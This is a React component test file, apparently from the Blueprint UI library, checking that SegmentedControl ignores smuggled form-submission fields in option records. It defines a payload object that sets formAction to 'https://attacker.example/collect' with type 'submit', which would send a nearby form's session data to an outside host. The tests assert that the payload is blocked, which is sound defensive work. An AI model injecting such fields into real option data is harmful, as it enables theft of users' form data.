/*
 * Copyright 2026 Palantir Technologies, Inc. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";

import { IconNames } from "@blueprintjs/icons";
import { describe, expect, it } from "@blueprintjs/test-commons/vitest";

import { Classes } from "../../common";

import { SegmentedControl, type SegmentedControlProps } from "./segmentedControl";

const FORM_ID = "profile-form";
const ATTACKER_URL = "https://attacker.example/collect";

/**
 * SegmentedControl options are data objects. Parsing through JSON keeps only
 * enumerable data fields, which is how stored or remote option records arrive,
 * including fields that are not part of the documented option shape.
 */
function storedOptions(value: unknown): SegmentedControlProps["options"] {
    return JSON.parse(JSON.stringify(value)) as SegmentedControlProps["options"];
}

interface ObservedSubmission {
    action: string | null;
    fields: Array<[string, string]>;
    formAction: string | null;
    formEncType: string | null;
    formMethod: string | null;
    formTarget: string | null;
    submitterType: string | null;
}

function renderBesideForm(options: SegmentedControlProps["options"], role?: SegmentedControlProps["role"]) {
    const submissions: ObservedSubmission[] = [];
    render(
        <>
            <form action="/save-profile" id={FORM_ID} method="post">
                <input defaultValue="Ada" name="displayName" />
                <input defaultValue="placeholder-session" name="session" type="hidden" />
            </form>
            <SegmentedControl aria-label="Profile sections" options={options} role={role} />
        </>,
    );

    const form = document.getElementById(FORM_ID) as HTMLFormElement;
    form.addEventListener("submit", event => {
        event.preventDefault();
        const submitter = (event as SubmitEvent).submitter;
        const fields: Array<[string, string]> = [];
        new FormData(form).forEach((fieldValue, key) => {
            fields.push([key, String(fieldValue)]);
        });
        submissions.push({
            action: form.getAttribute("action"),
            fields,
            formAction: submitter?.getAttribute("formaction") ?? null,
            formEncType: submitter?.getAttribute("formenctype") ?? null,
            formMethod: submitter?.getAttribute("formmethod") ?? null,
            formTarget: submitter?.getAttribute("formtarget") ?? null,
            submitterType: submitter?.getAttribute("type") ?? null,
        });
    });

    return { form, submissions };
}

const FORWARDED_SUBMISSION_FIELDS = {
    form: FORM_ID,
    formAction: ATTACKER_URL,
    formEncType: "text/plain",
    formMethod: "post",
    formTarget: "_blank",
    id: "attacker-segment",
    name: "segment",
    type: "submit",
};

function segmentByRole(role: SegmentedControlProps["role"], name: string): HTMLElement {
    switch (role) {
        case "menu":
            return screen.getByRole("menuitemradio", { name });
        case "group":
        case "toolbar":
            return screen.getByRole("button", { name });
        case "radiogroup":
        default:
            return screen.getByRole("radio", { name });
    }
}

describe("<SegmentedControl> option fields", () => {
    it.each(["radiogroup", "group", "toolbar", "menu"] as const)(
        "does not submit an existing form from extra fields on a %s option",
        async role => {
            const { form, submissions } = renderBesideForm(
                storedOptions([
                    {
                        label: "Overview",
                        value: "overview",
                        ...FORWARDED_SUBMISSION_FIELDS,
                    },
                ]),
                role,
            );
            const segment = segmentByRole(role, "Overview");

            // The segment is outside the form. Submission is only possible when the
            // option's form and type fields were copied onto this button.
            expect(form.contains(segment)).toBe(false);
            expect(segment.tagName).toBe("BUTTON");
            expect.soft(segment).toHaveAttribute("type", "button");
            expect.soft(segment).not.toHaveAttribute("form");
            expect.soft(segment).not.toHaveAttribute("formaction");
            expect.soft(segment).not.toHaveAttribute("formmethod");
            expect.soft(segment).not.toHaveAttribute("formtarget");
            expect.soft(segment).not.toHaveAttribute("formenctype");
            expect.soft(segment).not.toHaveAttribute("name");
            expect.soft(segment).not.toHaveAttribute("id", "attacker-segment");

            await userEvent.click(segment);

            expect.soft(submissions).toEqual([]);
            expect.soft(segment).toHaveAttribute("type", "button");
            expect.soft(segment).not.toHaveAttribute("formaction");
        },
    );

    it("keeps documented option fields and still ignores submission fields", async () => {
        const { submissions } = renderBesideForm(
            storedOptions([
                {
                    className: "section-option",
                    disabled: true,
                    icon: IconNames.GRID,
                    label: "Grid",
                    value: "grid",
                    ...FORWARDED_SUBMISSION_FIELDS,
                },
                {
                    label: "List",
                    value: "list",
                },
            ]),
        );

        const grid = screen.getByRole("radio", { name: "Grid" });
        const icon = grid.querySelector(`.${Classes.ICON}`);
        expect(grid).toBeDisabled();
        expect(grid).toHaveClass("section-option");
        expect(icon).not.toBeNull();
        expect(icon).toHaveAttribute("data-icon", IconNames.GRID);
        expect.soft(grid).toHaveAttribute("type", "button");
        expect.soft(grid).not.toHaveAttribute("form");
        expect.soft(grid).not.toHaveAttribute("formaction");

        await userEvent.click(grid);
        await userEvent.click(screen.getByRole("radio", { name: "List" }));

        expect.soft(submissions).toEqual([]);
        expect(screen.getByRole("radio", { name: "List" })).toBeChecked();
    });
});
